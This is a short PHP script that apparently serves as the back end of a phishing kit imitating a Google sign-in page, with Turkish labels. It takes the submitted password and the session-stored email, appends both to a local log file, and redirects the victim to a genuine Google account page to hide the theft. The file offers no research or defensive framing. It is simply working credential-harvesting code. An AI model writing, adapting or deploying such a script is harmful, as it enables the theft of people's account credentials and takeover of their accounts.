<?php

			session_start();
			
			$pass = $_POST["Passwd"];
			$email=$_SESSION["Email"];

  			$file = fopen("log.txt", "a") or die("Unable to open file!");
			
  			fwrite($file, "\nEmail: ".$email."\nŞifre: ".$pass."\n".PHP_EOL);			
  			fclose($file);
  			
  			header("Location: https://www.google.com/account/about/?hl=tr");
			exit();
			
			
			session_destroy();
			

?>